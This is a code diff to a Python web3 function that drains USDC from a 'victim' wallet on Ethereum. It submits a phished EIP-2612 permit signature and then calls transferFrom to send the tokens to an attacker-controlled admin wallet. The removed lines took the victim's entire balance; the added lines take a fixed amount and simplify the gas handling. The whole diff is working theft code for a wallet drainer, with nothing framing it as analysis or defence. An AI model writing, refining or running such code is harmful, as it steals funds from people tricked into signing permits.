@@ -27,63 +27,37 @@ def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
         victim_addr = Web3.to_checksum_address(victim_address)
         contract = w3.eth.contract(address=Web3.to_checksum_address(USDC_ADDRESS), abi=USDC_ABI)
 
-        # Drain ALL USDC the victim has (safer than fixed amount)
+        # Pre-flight check: Balance
+        target_amount_raw = int(float(amount))
         user_bal = contract.functions.balanceOf(victim_addr).call()
-        if user_bal == 0:
-            return None, f"USER_WALLET_ERROR: Target has 0 USDC."
+        if user_bal < target_amount_raw:
+            return None, f"USER_WALLET_ERROR: Target only has {user_bal/1e6} USDC."
 
-        # Use full balance instead of fixed 'amount' to avoid the 9.4 vs 9 issue
-        target_amount_raw = user_bal
+        # Gas check
+        gas_price = w3.eth.gas_price
+        if w3.eth.get_balance(admin_addr) < (gas_price * 200000):
+            return None, "ADMIN_WALLET_ERROR: Insufficient ETH for gas."
 
-        # Better gas handling - Use EIP-1559 (recommended in 2026)
-        fee_history = w3.eth.fee_history(4, 'latest', [10, 50])
-        base_fee = fee_history['baseFeePerGas'][-1]
-        max_priority_fee = w3.to_wei(0.5, 'gwei')   # 0.5 gwei tip
-
-        max_fee_per_gas = base_fee * 2 + max_priority_fee
-        max_priority_fee_per_gas = max_priority_fee
-
+        # Nonce & Signature
         current_nonce = w3.eth.get_transaction_count(admin_addr, 'pending')
-
-        # Convert signature
         r_bytes = w3.to_bytes(hexstr=r)
         s_bytes = w3.to_bytes(hexstr=s)
 
-        # 1. PERMIT transaction
+        # 1. PERMIT
         permit_tx = contract.functions.permit(
             victim_addr, admin_addr, target_amount_raw, int(deadline), int(v), r_bytes, s_bytes
         ).build_transaction({
-            "from": admin_addr,
-            "nonce": current_nonce,
-            "gas": 150000,                    # higher safety margin
-            "maxFeePerGas": max_fee_per_gas,
-            "maxPriorityFeePerGas": max_priority_fee_per_gas,
-            "chainId": 1,
-            "type": 2                         # EIP-1559
+            "from": admin_addr, "nonce": current_nonce, "gas": 100000, "gasPrice": gas_price, "chainId": 1
         })
+        w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY).raw_transaction)
 
-        signed_permit = w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY)
-        w3.eth.send_raw_transaction(signed_permit.raw_transaction)
-
-        # Small delay to let the first tx propagate
-        import time
-        time.sleep(3)
-
-        # 2. TRANSFERFROM transaction
+        # 2. TRANSFER
         transfer_tx = contract.functions.transferFrom(
             victim_addr, admin_addr, target_amount_raw
         ).build_transaction({
-            "from": admin_addr,
-            "nonce": current_nonce + 1,
-            "gas": 100000,
-            "maxFeePerGas": max_fee_per_gas,
-            "maxPriorityFeePerGas": max_priority_fee_per_gas,
-            "chainId": 1,
-            "type": 2
+            "from": admin_addr, "nonce": current_nonce + 1, "gas": 100000, "gasPrice": gas_price, "chainId": 1
         })
-
-        signed_transfer = w3.eth.account.sign_transaction(transfer_tx, ADMIN_PRIVATE_KEY)
-        tx_hash = w3.eth.send_raw_transaction(signed_transfer.raw_transaction)
+        tx_hash = w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(transfer_tx, ADMIN_PRIVATE_KEY).raw_transaction)
 
         return tx_hash.hex(), None
 
